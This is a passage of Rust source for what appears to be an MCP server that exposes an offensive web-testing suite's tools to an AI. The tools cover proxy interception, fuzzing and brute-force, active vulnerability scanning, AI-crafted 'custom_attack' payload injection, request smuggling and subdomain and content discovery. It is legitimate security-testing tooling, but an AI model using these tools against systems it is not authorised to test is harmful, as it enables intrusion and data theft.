use axum::{
    extract::Json,
    http::StatusCode,
    routing::post,
    Router,
};
use serde::{Deserialize, Serialize};
use std::net::SocketAddr;
use std::sync::Arc;
use tokio::sync::Mutex;

// ─── Global Activity Log — visible in WonderSuite UI ────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ActivityEntry {
    pub id: u64,
    pub timestamp: String,
    pub tool_name: String,
    pub category: String,
    pub params_summary: String,
    pub status: String,        // "running", "success", "error"
    pub result_summary: String,
    pub duration_ms: u64,
    pub target_url: String,    // extracted URL if present
}

static ACTIVITY_COUNTER: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);

lazy_static::lazy_static! {
    static ref ACTIVITY_LOG: std::sync::Mutex<Vec<ActivityEntry>> = std::sync::Mutex::new(Vec::new());
}

fn tool_category(name: &str) -> &'static str {
    match name {
        "send_request" | "repeat_request" | "h2_send_request" => "http",
        "active_scan" | "scan_target" | "full_auto_scan" | "dom_invader" => "scanner",
        "crawl_target" | "discover_content" | "discover_subdomains" | "dns_resolve" | "find_secrets" | "analyze_target" | "h2_detect_support" => "recon",
        "fuzz_request" | "custom_attack" | "race_request" | "timing_attack" => "intruder",
        "smuggling_send" | "detect_smuggling" | "raw_tcp_send" | "test_auth_bypass" | "test_open_redirect" => "exploit",
        "browser_navigate" | "browser_execute_js" | "session_from_browser" => "browser",
        "encode" | "decode" | "hash" | "smart_decode" | "h2_translate" | "process_payload" | "generate_payload" => "codec",
        "proxy_start" | "proxy_stop" | "proxy_status" | "proxy_get_traffic" => "proxy",
        "oast_generate_payload" | "oast_poll_interactions" | "oast_verify" | "oast_start_server" | "collaborator_everywhere" => "oast",
        "websocket_connect" | "websocket_edit" | "websocket_advanced" => "websocket",
        "generate_report" | "organize_findings" | "generate_csrf_poc" => "reporting",
        _ => "other",
    }
}

fn extract_target_url(params: &serde_json::Value) -> String {
    params["url"].as_str()
        .or(params["target"].as_str())
        .or(params["domain"].as_str())
        .or(params["host"].as_str())
        .unwrap_or("")
        .to_string()
}

fn summarize_params(name: &str, params: &serde_json::Value) -> String {
    let url = extract_target_url(params);
    let method = params["method"].as_str().unwrap_or("");
    let action = params["action"].as_str().unwrap_or("");

    match name {
        "send_request" | "h2_send_request" => format!("{} {}", method, url),
        "browser_navigate" => format!("{} → {}", action, url),
        "browser_execute_js" => {
            let code = params["code"].as_str().unwrap_or("");
            format!("JS: {}…", &code[..code.len().min(60)])
        }
        "active_scan" | "crawl_target" | "full_auto_scan" => format!("Target: {}", url),
        "smuggling_send" => {
            let tech = params["technique"].as_str().unwrap_or("manual");
            format!("{} → {}", tech, params["host"].as_str().unwrap_or(&url))
        }
        "dns_resolve" => format!("Resolve: {}", params["domain"].as_str().unwrap_or("")),
        "race_request" => {
            let count = params["requests"].as_array().map(|a| a.len()).unwrap_or(0);
            format!("{} parallel requests", count)
        }
        _ if !url.is_empty() => url.clone(),
        _ if !action.is_empty() => action.to_string(),
        _ => {
            let s = serde_json::to_string(params).unwrap_or_default();
            if s.len() > 60 { format!("{}…", &s[..57]) } else { s }
        }
    }
}

fn summarize_result(result: &serde_json::Value) -> String {
    // Try various common response fields
    if let Some(status) = result["status"].as_u64() {
        let len = result["body_length"].as_u64().or(result["body_size"].as_u64()).unwrap_or(0);
        return format!("HTTP {} ({} bytes)", status, len);
    }
    if let Some(findings) = result["findings"].as_array() {
        return format!("{} findings", findings.len());
    }
    if let Some(h2) = result["h2_supported"].as_bool() {
        return format!("H2: {}", if h2 { "✓ supported" } else { "✗ not supported" });
    }
    if let Some(urls) = result["urls"].as_array() {
        return format!("{} URLs discovered", urls.len());
    }
    let s = serde_json::to_string(result).unwrap_or_default();
    if s.len() > 80 { format!("{}…", &s[..77]) } else { s }
}

pub fn log_activity_start(tool_name: &str, params: &serde_json::Value) -> u64 {
    let id = ACTIVITY_COUNTER.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let entry = ActivityEntry {
        id,
        timestamp: chrono::Utc::now().format("%H:%M:%S.%3f").to_string(),
        tool_name: tool_name.to_string(),
        category: tool_category(tool_name).to_string(),
        params_summary: summarize_params(tool_name, params),
        status: "running".to_string(),
        result_summary: String::new(),
        duration_ms: 0,
        target_url: extract_target_url(params),
    };
    if let Ok(mut log) = ACTIVITY_LOG.lock() {
        log.push(entry);
        // Keep last 500 entries
        if log.len() > 500 { let drain = log.len() - 500; log.drain(..drain); }
    }
    id
}

pub fn log_activity_finish(id: u64, status: &str, result_summary: String, duration_ms: u64) {
    if let Ok(mut log) = ACTIVITY_LOG.lock() {
        if let Some(entry) = log.iter_mut().find(|e| e.id == id) {
            entry.status = status.to_string();
            entry.result_summary = result_summary;
            entry.duration_ms = duration_ms;
        }
    }
}

pub fn get_activity_log(since_id: u64) -> Vec<ActivityEntry> {
    ACTIVITY_LOG.lock().map(|log| {
        log.iter().filter(|e| e.id >= since_id).cloned().collect()
    }).unwrap_or_default()
}

pub fn get_activity_stats() -> serde_json::Value {
    let log = ACTIVITY_LOG.lock().unwrap_or_else(|e| e.into_inner());
    let total = log.len();
    let running = log.iter().filter(|e| e.status == "running").count();
    let errors = log.iter().filter(|e| e.status == "error").count();
    let success = log.iter().filter(|e| e.status == "success").count();
    serde_json::json!({
        "total": total,
        "running": running,
        "success": success,
        "errors": errors,
    })
}

// ─── MCP Traffic Log —— HTTP requests piped into Traffic UI ────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct McpTrafficEntry {
    pub id: u64,
    pub timestamp: String,
    pub method: String,
    pub url: String,
    pub host: String,
    pub path: String,
    pub tls: bool,
    pub status: u16,
    pub response_length: usize,
    pub response_time_ms: u64,
    pub mime_type: String,
    pub request_headers: String,
    pub request_body: String,
    pub response_headers: String,
    pub response_body: String,
    pub source: String,
    pub notes: String,
    pub color: String,
}

static MCP_TRAFFIC_COUNTER: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(100000);

lazy_static::lazy_static! {
    static ref MCP_TRAFFIC_LOG: std::sync::Mutex<Vec<McpTrafficEntry>> = std::sync::Mutex::new(Vec::new());
}

pub fn log_mcp_traffic(entry: McpTrafficEntry) {
    if let Ok(mut log) = MCP_TRAFFIC_LOG.lock() {
        log.push(entry);
        if log.len() > 2000 { let drain = log.len() - 2000; log.drain(..drain); }
    }
}

pub fn get_mcp_traffic(since_id: u64) -> Vec<McpTrafficEntry> {
    MCP_TRAFFIC_LOG.lock().map(|log| {
        log.iter().filter(|e| e.id > since_id).cloned().collect()
    }).unwrap_or_default()
}

pub fn next_mcp_traffic_id() -> u64 {
    MCP_TRAFFIC_COUNTER.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct JsonRpcRequest {
    jsonrpc: String,
    id: Option<serde_json::Value>,
    method: String,
    #[serde(default)]
    params: serde_json::Value,
}

#[derive(Debug, Serialize)]
struct JsonRpcResponse {
    jsonrpc: String,
    id: Option<serde_json::Value>,
    #[serde(skip_serializing_if = "Option::is_none")]
    result: Option<serde_json::Value>,
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<JsonRpcError>,
}

#[derive(Debug, Serialize)]
struct JsonRpcError {
    code: i32,
    message: String,
}

#[derive(Debug, Serialize)]
struct ToolDef {
    name: String,
    description: String,
    #[serde(rename = "inputSchema")]
    input_schema: serde_json::Value,
}

fn tool_definitions() -> Vec<ToolDef> {
    vec![
        // ─── HTTP Tools ──────────────────────────────────────────────────
        ToolDef {
            name: "send_request".into(),
            description: "Send an HTTP request to any URL and return the response".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "method": { "type": "string", "enum": ["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS"] },
                    "url": { "type": "string", "description": "Target URL" },
                    "body": { "type": "string", "description": "Request body (optional)" },
                    "headers": { "type": "object", "description": "Additional headers" }
                },
                "required": ["method", "url"]
            }),
        },
        ToolDef {
            name: "encode".into(),
            description: "Encode data using Base64, URL, HTML, or Hex encoding".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "data": { "type": "string" },
                    "format": { "type": "string", "enum": ["base64","url","html","hex"] }
                },
                "required": ["data", "format"]
            }),
        },
        ToolDef {
            name: "decode".into(),
            description: "Decode data from Base64, URL, HTML, or Hex encoding".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "data": { "type": "string" },
                    "format": { "type": "string", "enum": ["base64","url","html","hex"] }
                },
                "required": ["data", "format"]
            }),
        },
        ToolDef {
            name: "hash".into(),
            description: "Hash data using SHA-256, SHA-1, or SHA-512".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "data": { "type": "string" },
                    "algorithm": { "type": "string", "enum": ["sha256","sha1","sha512"] }
                },
                "required": ["data", "algorithm"]
            }),
        },
        ToolDef {
            name: "analyze_jwt".into(),
            description: "Decode and analyze a JWT token, showing header, payload, and expiry".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "token": { "type": "string", "description": "JWT token to analyze" }
                },
                "required": ["token"]
            }),
        },
        ToolDef {
            name: "generate_payload".into(),
            description: "Generate security testing payloads for XSS, SQLi, or path traversal".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "type": { "type": "string", "enum": ["xss","sqli","path_traversal","ssti","xxe"] },
                    "count": { "type": "integer", "description": "Number of payloads to generate", "default": 5 }
                },
                "required": ["type"]
            }),
        },
        // ─── Proxy Engine Tools ──────────────────────────────────────────
        ToolDef {
            name: "proxy_start".into(),
            description: "Start the WonderSuite MITM proxy on a specified port".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "port": { "type": "integer", "description": "Port to listen on", "default": 8080 }
                },
                "required": []
            }),
        },
        ToolDef {
            name: "proxy_stop".into(),
            description: "Stop the running MITM proxy".into(),
            input_schema: serde_json::json!({ "type": "object", "properties": {} }),
        },
        ToolDef {
            name: "proxy_status".into(),
            description: "Get current proxy status including running state, port, request count, intercept state, and configuration".into(),
            input_schema: serde_json::json!({ "type": "object", "properties": {} }),
        },
        ToolDef {
            name: "proxy_toggle_intercept".into(),
            description: "Enable or disable request interception".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "enabled": { "type": "boolean", "description": "Whether to enable interception" },
                    "response_intercept": { "type": "boolean", "description": "Also intercept responses (optional)" }
                },
                "required": ["enabled"]
            }),
        },
        ToolDef {
            name: "proxy_get_traffic".into(),
            description: "Get all captured HTTP traffic from the proxy".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "limit": { "type": "integer", "description": "Max entries to return", "default": 50 }
                }
            }),
        },
        ToolDef {
            name: "proxy_search_traffic".into(),
            description: "Search captured traffic by URL, host, headers, or response body".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "query": { "type": "string", "description": "Search query string" }
                },
                "required": ["query"]
            }),
        },
        ToolDef {
            name: "proxy_add_match_replace".into(),
            description: "Add a match & replace rule for automatic in-flight traffic modification".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "name": { "type": "string", "description": "Rule name" },
                    "target": { "type": "string", "enum": ["request_header","request_body","response_header","response_body","request_url"] },
                    "match_pattern": { "type": "string", "description": "String or regex to match" },
                    "replace_value": { "type": "string", "description": "Replacement string" },
                    "is_regex": { "type": "boolean", "description": "Whether match_pattern is a regex", "default": false },
                    "direction": { "type": "string", "enum": ["request","response","both"], "default": "both" }
                },
                "required": ["name", "target", "match_pattern", "replace_value"]
            }),
        },
        ToolDef {
            name: "proxy_get_match_replace".into(),
            description: "Get all match & replace rules".into(),
            input_schema: serde_json::json!({ "type": "object", "properties": {} }),
        },
        ToolDef {
            name: "proxy_add_tls_passthrough".into(),
            description: "Add a host to the TLS pass-through list (bypass MITM for this host)".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "host": { "type": "string", "description": "Host pattern (e.g. *.google.com)" },
                    "port": { "type": "integer", "description": "Optional port (default: any)" }
                },
                "required": ["host"]
            }),
        },
        ToolDef {
            name: "proxy_set_upstream".into(),
            description: "Configure upstream proxy for traffic chaining (HTTP or SOCKS5)".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "enabled": { "type": "boolean" },
                    "proxy_type": { "type": "string", "enum": ["http","socks5"] },
                    "host": { "type": "string" },
                    "port": { "type": "integer" },
                    "username": { "type": "string" },
                    "password": { "type": "string" }
                },
                "required": ["enabled", "proxy_type", "host", "port"]
            }),
        },
        ToolDef {
            name: "proxy_get_websocket_messages".into(),
            description: "Get all captured WebSocket messages".into(),
            input_schema: serde_json::json!({ "type": "object", "properties": {} }),
        },
        ToolDef {
            name: "proxy_add_interception_rule".into(),
            description: "Add a rule to control which requests/responses are intercepted".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "name": { "type": "string" },
                    "rule_type": { "type": "string", "enum": ["url_contains","url_regex","host_equals","method_equals","file_extension"] },
                    "pattern": { "type": "string", "description": "Pattern to match against" },
                    "action": { "type": "string", "enum": ["intercept","passthrough"], "default": "intercept" },
                    "target": { "type": "string", "enum": ["request","response","both"], "default": "both" }
                },
                "required": ["name", "rule_type", "pattern"]
            }),
        },
        // ─── Repeater MCP Tool ──────────────────────────────────────────
        ToolDef {
            name: "repeat_request".into(),
            description: "Send an HTTP request via the Repeater, manage tabs, and view history".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "action": { "type": "string", "enum": ["send","create_tab","list_tabs","get_history","close_tab"], "description": "Repeater action" },
                    "method": { "type": "string", "enum": ["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS"] },
                    "url": { "type": "string" },
                    "headers": { "type": "object" },
                    "body": { "type": "string" },
                    "tab_name": { "type": "string" },
                    "tab_id": { "type": "string" },
                    "follow_redirects": { "type": "boolean", "default": true },
                    "auto_content_length": { "type": "boolean", "default": true }
                },
                "required": ["action"]
            }),
        },
        // ─── Intruder/Fuzzer MCP Tool ───────────────────────────────────
        ToolDef {
            name: "fuzz_request".into(),
            description: "Create and run automated fuzzing/bruteforce attacks against request parameters".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "action": { "type": "string", "enum": ["create","start","status","results","stop"] },
                    "request_template": { "type": "string", "description": "Raw HTTP request with §markers§ for injection positions" },
                    "attack_type": { "type": "string", "enum": ["sniper","battering_ram","pitchfork","cluster_bomb"] },
                    "payload_sets": {
                        "type": "array",
                        "items": {
                            "type": "object",
                            "properties": {
                                "type": { "type": "string", "enum": ["wordlist","numbers","bruteforce","dates","null_payloads"] },
                                "values": { "type": "array", "items": { "type": "string" } },
                                "processors": { "type": "array", "items": { "type": "string" } }
                            }
                        }
                    },
                    "options": {
                        "type": "object",
                        "properties": {
                            "max_concurrent": { "type": "integer", "default": 5 },
                            "throttle_ms": { "type": "integer", "default": 0 },
                            "follow_redirects": { "type": "boolean", "default": false },
                            "grep_match": { "type": "array", "items": { "type": "string" } }
                        }
                    },
                    "attack_id": { "type": "string" }
                },
                "required": ["action"]
            }),
        },
        // ─── Scanner MCP Tool ───────────────────────────────────────────
        ToolDef {
            name: "scan_target".into(),
            description: "Start, manage, and query vulnerability scans against target URLs".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "action": { "type": "string", "enum": ["start","status","pause","resume","stop","get_issues","configure"] },
                    "target": { "type": "string", "description": "Target URL to scan" },
                    "scan_id": { "type": "string" },
                    "scan_type": { "type": "string", "enum": ["crawl_and_audit","passive_audit","owasp_top10","lightweight"] },
                    "config": {
                        "type": "object",
                        "properties": {
                            "max_depth": { "type": "integer", "default": 3 },
                            "max_requests": { "type": "integer", "default": 500 },
                            "check_headers": { "type": "boolean", "default": true },
                            "check_cookies": { "type": "boolean", "default": true },
                            "check_cors": { "type": "boolean", "default": true }
                        }
                    },
                    "issue_filter": {
                        "type": "object",
                        "properties": {
                            "severity": { "type": "string", "enum": ["critical","high","medium","low","info"] },
                            "confidence": { "type": "string", "enum": ["certain","firm","tentative"] }
                        }
                    }
                },
                "required": ["action"]
            }),
        },
        // ─── Sequencer MCP Tool ─────────────────────────────────────────
        ToolDef {
            name: "analyze_tokens".into(),
            description: "Analyze token entropy using Shannon entropy, FIPS 140-2 tests, and per-position bit analysis".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "tokens": { "type": "array", "items": { "type": "string" }, "description": "List of tokens to analyze" },
                    "tests": { "type": "array", "items": { "type": "string", "enum": ["shannon","fips_monobit","fips_poker","fips_runs","fips_longrun","distribution","bit_analysis","all"] } }
                },
                "required": ["tokens"]
            }),
        },
        // ─── Comparer MCP Tool ──────────────────────────────────────────
        ToolDef {
            name: "compare_data".into(),
            description: "Compare two data items using word-level or line-level diff with highlighting".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "item_1": { "type": "string", "description": "First item to compare" },
                    "item_2": { "type": "string", "description": "Second item to compare" },
                    "mode": { "type": "string", "enum": ["words","lines"], "default": "words" }
                },
                "required": ["item_1", "item_2"]
            }),
        },
        // ─── Logger MCP Tool ────────────────────────────────────────────
        ToolDef {
            name: "query_logs".into(),
            description: "Query centralized HTTP traffic logs from all tools (Proxy, Scanner, Intruder, Repeater)".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "tool": { "type": "string", "enum": ["all","proxy","scanner","intruder","repeater"], "default": "all" },
                    "filter": { "type": "string", "description": "Search query (URL, host, body content)" },
                    "limit": { "type": "integer", "default": 100 },
                    "export_format": { "type": "string", "enum": ["json","csv"] }
                }
            }),
        },
        // ─── Organizer MCP Tool ─────────────────────────────────────────
        ToolDef {
            name: "organize_findings".into(),
            description: "Save, annotate, and manage findings in collections for manual testing workflow".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "action": { "type": "string", "enum": ["save","list","update","delete","create_collection","list_collections","export"] },
                    "request_data": { "type": "string", "description": "Raw request to save" },
                    "url": { "type": "string" },
                    "method": { "type": "string" },
                    "notes": { "type": "string" },
                    "status": { "type": "string", "enum": ["new","in_progress","done","ignored"] },
                    "color": { "type": "string" },
                    "collection": { "type": "string" },
                    "item_id": { "type": "string" }
                },
                "required": ["action"]
            }),
        },
        // ─── Proxy Capabilities MCP Tool ────────────────────────────────
        ToolDef {
            name: "proxy_get_capabilities".into(),
            description: "Get full list of proxy engine capabilities and feature support status".into(),
            input_schema: serde_json::json!({ "type": "object", "properties": {} }),
        },
        // ─── Proxy Statistics MCP Tool ──────────────────────────────────
        ToolDef {
            name: "proxy_get_statistics".into(),
            description: "Get proxy runtime statistics (requests, bandwidth, timing, errors)".into(),
            input_schema: serde_json::json!({ "type": "object", "properties": {} }),
        },
        // ─── Inspector MCP Tool ─────────────────────────────────────────
        ToolDef {
            name: "inspect_message".into(),
            description: "Parse and analyze HTTP messages into structured components (headers, params, cookies)".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "raw_message": { "type": "string", "description": "Raw HTTP request or response" },
                    "auto_decode": { "type": "boolean", "default": true, "description": "Auto-decode URL/Base64 values" }
                },
                "required": ["raw_message"]
            }),
        },
        // ─── Traffic Export MCP Tool ─────────────────────────────────────
        ToolDef {
            name: "proxy_clear_traffic".into(),
            description: "Clear all captured proxy traffic".into(),
            input_schema: serde_json::json!({ "type": "object", "properties": {} }),
        },
        ToolDef {
            name: "proxy_export_traffic".into(),
            description: "Export captured traffic as JSON".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "format": { "type": "string", "enum": ["json","csv"], "default": "json" }
                }
            }),
        },
        // ─── Browser Navigation MCP Tool (AI can open pages) ────────────
        ToolDef {
            name: "browser_navigate".into(),
            description: "Open a URL in the WonderSuite Browser, navigate to pages, interact with endpoints. Allows AI to browse websites through the proxy.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "action": { "type": "string", "enum": ["open","navigate","get_page","list_tabs","close_tab","get_cookies","screenshot"], "description": "Browser action to perform" },
                    "url": { "type": "string", "description": "URL to open or navigate to" },
                    "tab_id": { "type": "integer", "description": "Tab ID for tab-specific actions" },
                    "wait_ms": { "type": "integer", "description": "Wait time after navigation in milliseconds", "default": 2000 }
                },
                "required": ["action"]
            }),
        },
        // ─── Active Scanner MCP Tool (Enterprise v2) ─────────────────────
        ToolDef {
            name: "active_scan".into(),
            description: "Run a full active vulnerability scan with payload injection (SQLi, XSS, SSRF, SSTI, XXE, path traversal, command injection, open redirect, CORS, headers, cookies). Auto-crawls to discover endpoints, detects technologies, logs all requests/responses.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": { "type": "string", "description": "Target URL to scan (include query params for injection testing)" },
                    "checks": {
                        "type": "array",
                        "items": { "type": "string", "enum": ["sqli","xss","ssrf","ssti","xxe","path_traversal","command_injection","open_redirect","cors","headers","cookies","info_disclosure","all"] },
                        "default": ["all"]
                    },
                    "max_requests": { "type": "integer", "default": 200 },
                    "timeout_ms": { "type": "integer", "default": 10000 },
                    "follow_redirects": { "type": "boolean", "default": true },
                    "auto_crawl": { "type": "boolean", "default": true, "description": "Auto-crawl target to discover endpoints and injection points" },
                    "crawl_depth": { "type": "integer", "default": 2, "description": "Maximum crawl depth for endpoint discovery" }
                },
                "required": ["target"]
            }),
        },
        // ─── Custom Attack Tool (AI-Driven Payloads) ────────────────────
        ToolDef {
            name: "custom_attack".into(),
            description: "Execute a custom attack with AI-crafted payloads against a target. Sends custom requests and analyzes responses for vulnerability indicators. Supports GET/POST with custom headers and body.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": { "type": "string", "description": "Target URL" },
                    "method": { "type": "string", "enum": ["GET","POST","PUT","DELETE","PATCH","OPTIONS","HEAD"], "default": "GET" },
                    "payloads": {
                        "type": "array",
                        "items": {
                            "type": "object",
                            "properties": {
                                "inject_in": { "type": "string", "enum": ["url_param","header","body","cookie","path"], "description": "Where to inject the payload" },
                                "param_name": { "type": "string", "description": "Parameter/header name to inject into" },
                                "payload": { "type": "string", "description": "The payload string to inject" },
                                "match_in_response": { "type": "string", "description": "String/regex to look for in response indicating success" }
                            },
                            "required": ["inject_in", "payload"]
                        },
                        "description": "List of custom payloads to inject"
                    },
                    "headers": { "type": "object", "description": "Custom headers to send" },
                    "body": { "type": "string", "description": "Request body for POST/PUT" },
                    "follow_redirects": { "type": "boolean", "default": false },
                    "compare_baseline": { "type": "boolean", "default": true, "description": "Compare response with clean baseline request" },
                    "timeout_ms": { "type": "integer", "default": 10000 }
                },
                "required": ["target", "payloads"]
            }),
        },
        // ─── Session Handling MCP Tool ───────────────────────────────────
        ToolDef {
            name: "session_manage".into(),
            description: "Manage session state: cookie jar, macros, and session rules".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "action": { "type": "string", "enum": ["get_cookies","set_cookie","clear_cookies","remove_cookie","create_macro","run_macro","list_macros","create_rule","list_rules"] },
                    "domain": { "type": "string" },
                    "cookie_name": { "type": "string" },
                    "cookie_value": { "type": "string" },
                    "cookie_path": { "type": "string", "default": "/" },
                    "macro_name": { "type": "string" },
                    "macro_steps": {
                        "type": "array",
                        "items": {
                            "type": "object",
                            "properties": {
                                "method": { "type": "string" },
                                "url": { "type": "string" },
                                "headers": { "type": "object" },
                                "body": { "type": "string" }
                            }
                        }
                    },
                    "macro_id": { "type": "string" }
                },
                "required": ["action"]
            }),
        },
        // ─── Report Generation MCP Tool ─────────────────────────────────
        ToolDef {
            name: "generate_report".into(),
            description: "Generate vulnerability reports in HTML or JSON format from scan findings".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "format": { "type": "string", "enum": ["html","json"], "default": "html" },
                    "title": { "type": "string", "default": "Security Assessment Report" },
                    "findings": {
                        "type": "array",
                        "items": {
                            "type": "object",
                            "properties": {
                                "name": { "type": "string" },
                                "severity": { "type": "string" },
                                "confidence": { "type": "string" },
                                "url": { "type": "string" },
                                "parameter": { "type": "string" },
                                "detail": { "type": "string" },
                                "evidence": { "type": "string" },
                                "remediation": { "type": "string" }
                            }
                        }
                    },
                    "include_evidence": { "type": "boolean", "default": true },
                    "include_remediation": { "type": "boolean", "default": true },
                    "severity_filter": { "type": "array", "items": { "type": "string" } }
                },
                "required": ["findings"]
            }),
        },
        // ─── Payload Processor MCP Tool ─────────────────────────────────
        ToolDef {
            name: "process_payload".into(),
            description: "Apply transformations to payloads: encode, decode, hash, add prefix/suffix, replace patterns".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "payload": { "type": "string", "description": "Input payload to process" },
                    "processors": {
                        "type": "array",
                        "description": "List of processors to apply in order",
                        "items": {
                            "type": "object",
                            "properties": {
                                "type": { "type": "string", "enum": ["url_encode","url_decode","base64_encode","base64_decode","hex_encode","hex_decode","html_encode","html_decode","sha256","sha1","md5","prefix","suffix","match_replace","lowercase","uppercase","reverse","length_padding"] },
                                "value": { "type": "string", "description": "Value for prefix/suffix/match_replace" },
                                "replace_with": { "type": "string", "description": "Replacement for match_replace" }
                            },
                            "required": ["type"]
                        }
                    }
                },
                "required": ["payload", "processors"]
            }),
        },
        // ─── Grep Extract MCP Tool ──────────────────────────────────────
        ToolDef {
            name: "grep_extract".into(),
            description: "Extract data from HTTP responses using regex patterns".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "text": { "type": "string", "description": "Text to extract from (response body/headers)" },
                    "patterns": {
                        "type": "array",
                        "items": {
                            "type": "object",
                            "properties": {
                                "name": { "type": "string", "description": "Name for the extracted value" },
                                "regex": { "type": "string", "description": "Regex pattern (with capture group)" },
                                "group": { "type": "integer", "description": "Capture group index", "default": 1 }
                            },
                            "required": ["name", "regex"]
                        }
                    }
                },
                "required": ["text", "patterns"]
            }),
        },
        // ─── WebSocket Edit MCP Tool ────────────────────────────────────
        ToolDef {
            name: "websocket_edit".into(),
            description: "Modify and replay WebSocket frames".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "action": { "type": "string", "enum": ["send","modify","replay","list_connections"] },
                    "connection_id": { "type": "string" },
                    "message_data": { "type": "string" },
                    "direction": { "type": "string", "enum": ["client_to_server","server_to_client"], "default": "client_to_server" }
                },
                "required": ["action"]
            }),
        },

        // ═══════════════════════════════════════════════════════════════════
        //  NEW ENTERPRISE TOOLS — Full Bug Bounty Automation Suite
        // ═══════════════════════════════════════════════════════════════════

        // ─── Active Crawler ─────────────────────────────────────────────
        ToolDef {
            name: "crawl_target".into(),
            description: "Actively crawl a website: follow links, discover endpoints, extract forms, find API routes. Returns a complete site map with all discovered URLs, parameters, and forms.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": { "type": "string", "description": "Base URL to start crawling (e.g. https://example.com)" },
                    "max_depth": { "type": "integer", "default": 5, "description": "Maximum crawl depth from start URL" },
                    "max_pages": { "type": "integer", "default": 200, "description": "Maximum number of pages to crawl" },
                    "scope": { "type": "string", "enum": ["same_host","same_domain","same_origin"], "default": "same_host", "description": "Scope restriction for crawling" },
                    "extract_forms": { "type": "boolean", "default": true, "description": "Extract HTML forms with inputs" },
                    "extract_links": { "type": "boolean", "default": true, "description": "Follow and collect all links" },
                    "extract_scripts": { "type": "boolean", "default": true, "description": "Collect JavaScript file URLs" },
                    "extract_comments": { "type": "boolean", "default": true, "description": "Extract HTML/JS comments" },
                    "extract_emails": { "type": "boolean", "default": true, "description": "Find email addresses" },
                    "extract_api_endpoints": { "type": "boolean", "default": true, "description": "Find API endpoints in JS files" },
                    "custom_headers": { "type": "object", "description": "Custom headers for crawler requests" },
                    "cookies": { "type": "string", "description": "Cookie header for authenticated crawling" },
                    "user_agent": { "type": "string", "description": "Custom User-Agent" },
                    "timeout_ms": { "type": "integer", "default": 10000 },
                    "respect_robots_txt": { "type": "boolean", "default": false }
                },
                "required": ["target"]
            }),
        },
        // ─── Subdomain Discovery ────────────────────────────────────────
        ToolDef {
            name: "discover_subdomains".into(),
            description: "Enumerate subdomains of a target domain using DNS resolution, common subdomain wordlists, and certificate transparency logs. Essential for reconnaissance phase of bug bounty.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "domain": { "type": "string", "description": "Target domain (e.g. example.com)" },
                    "wordlist": { "type": "string", "enum": ["small","medium","large","custom"], "default": "medium", "description": "Subdomain wordlist size (small=100, medium=1000, large=5000)" },
                    "custom_words": { "type": "array", "items": { "type": "string" }, "description": "Custom subdomain prefixes to check" },
                    "use_crt_sh": { "type": "boolean", "default": true, "description": "Query crt.sh certificate transparency logs" },
                    "resolve_ips": { "type": "boolean", "default": true, "description": "Resolve found subdomains to IP addresses" },
                    "check_http": { "type": "boolean", "default": true, "description": "Check if discovered subdomains respond on HTTP/HTTPS" },
                    "max_concurrent": { "type": "integer", "default": 20, "description": "Max concurrent DNS lookups" },
                    "timeout_ms": { "type": "integer", "default": 5000 }
                },
                "required": ["domain"]
            }),
        },
        // ─── Content Discovery (Dir/File Bruteforce) ────────────────────
        ToolDef {
            name: "discover_content".into(),
            description: "Brute-force discover hidden directories, files, and endpoints on a target. Like ffuf/dirbuster/gobuster. Finds admin panels, backup files, config files, API endpoints.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": { "type": "string", "description": "Base URL (e.g. https://example.com)" },
                    "wordlist": { "type": "string", "enum": ["common","medium","large","api","backup","admin","custom"], "default": "common", "description": "Wordlist to use" },
                    "custom_words": { "type": "array", "items": { "type": "string" }, "description": "Custom paths to check" },
                    "extensions": { "type": "array", "items": { "type": "string" }, "default": ["","php","html","js","json","xml","txt","bak","old","conf","env"], "description": "File extensions to append" },
